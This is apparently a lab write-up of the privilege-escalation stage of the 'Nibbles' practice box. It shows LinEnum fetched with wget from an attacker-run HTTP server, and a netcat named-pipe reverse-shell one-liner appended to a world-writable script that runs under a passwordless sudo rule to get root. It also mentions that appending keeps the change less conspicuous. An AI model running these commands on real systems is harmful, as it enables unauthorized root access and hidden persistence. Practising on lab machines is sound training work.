# Nibbles: Privilege Escalation

## Overview

With a foothold established as the low-privileged `nibbler` user, this stage covers finding and exploiting a file-based misconfiguration to escalate to root.

## Learning Objectives

- Extract and inspect files found in a user's home directory
- Run automated enumeration (LinEnum) on a target via a transferred script
- Identify and abuse a world-writable script referenced by a passwordless sudo rule
- Escalate to root by appending a payload rather than overwriting the original file

## Discovering personal.zip

The `personal.zip` archive found in `/home/nibbler` was extracted directly on the target:

```bash
unzip personal.zip
```

This revealed `personal/stuff/monitor.sh` — a monitoring script owned by `nibbler` that turned out to be **world-writable**.

## Automated Enumeration with LinEnum

To confirm how that script might be abused, **LinEnum.sh** was transferred over using the HTTP server method covered in the file transfer lesson:

```bash
sudo python3 -m http.server 8080          # on the attacking machine
wget http://<attacker-ip>:8080/LinEnum.sh  # on the target
chmod +x LinEnum.sh
./LinEnum.sh
```

LinEnum flagged the key finding directly:

```
User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

`nibbler` can run that exact script as root, without a password — and also has full write control over its contents. That combination is a direct path to a root shell.

## Exploiting the Sudo Misconfiguration

Rather than overwriting the script outright (which could break something relying on its original content, and is generally bad practice), the reverse-shell one-liner was **appended** to the end of the file:

```bash
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <attacker-ip> <port> >/tmp/f' | tee -a monitor.sh
```

`tee -a` appends rather than truncates — always take a backup and append rather than overwrite when modifying a file you don't fully control the purpose of.

## Root

With a listener running and the payload appended, the script was executed through the sudo rule:

```bash
sudo /home/nibbler/personal/stuff/monitor.sh
```

This caught a root shell on the waiting netcat listener, confirmed with:

```bash
id
# uid=0(root) gid=0(root) groups=0(root)
```

From there, `root.txt` completes the box.

## Skills Practiced

- Home directory enumeration and archive extraction
- Transferring and running automated privilege escalation scripts (LinEnum)
- Exploiting a `NOPASSWD` sudo rule combined with a world-writable script
- Safe modification of target files (append vs. overwrite)

## Key Takeaways

- A sudo rule restricted to one specific script is only as secure as the permissions on that script itself — if it's writable by the user allowed to run it as root, the restriction is meaningless.
- Appending to a file rather than overwriting it preserves whatever the original script was doing, reducing the chance of breaking something else that depends on it (and keeps the change less conspicuous).
- LinEnum and similar scripts are excellent at surfacing sudo misconfigurations quickly — but understanding why the finding matters (write access + NOPASSWD) is what actually turns it into root.
- After finishing a box, deliberately replicating it independently — ideally with different tools — cements the techniques far more than moving straight to the next target.
